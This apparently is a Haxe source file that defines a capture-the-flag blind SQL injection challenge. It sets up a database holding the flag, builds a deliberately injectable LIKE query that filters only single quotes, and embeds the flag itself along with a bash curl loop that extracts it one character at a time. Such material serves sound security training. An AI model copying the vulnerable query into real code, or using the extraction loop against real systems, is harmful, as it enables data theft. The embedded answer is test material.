package chal.sqli;

class A07Blind extends Base {
  public function new() {
    super("07-blind");
    databaseSetup = "CREATE TABLE flag_table (flag TEXT, pw TEXT);"
      + "INSERT INTO flag_table VALUES('emp_0h-no-cant-533', 'pass=robob');";
    databaseQuery = [SQL("SELECT 1 FROM flag_table WHERE flag LIKE 'emp_"), InputFilter([
        Words(["'"], false)
      ]), SQL("'")];
    flag = "emp_0h-no-cant-533";
    script = '#!/bin/bash
LOGIN="anonymous"
FLAG=""
for i in {0..30}; do
  for char in {a..z} {0..9} -; do
    curl -X POST -s -b "login=$$LOGIN" \\
      --data-urlencode "query=$$FLAG$$char%" \\
      "http://${Config.http.host}:${Config.http.port}/" | grep "(no results)" >/dev/null
    if [[ "$?" -eq 1 ]]; then
      FLAG="$$FLAG$$char"
      echo "$$FLAG"
    fi
  done
done';
  }
}
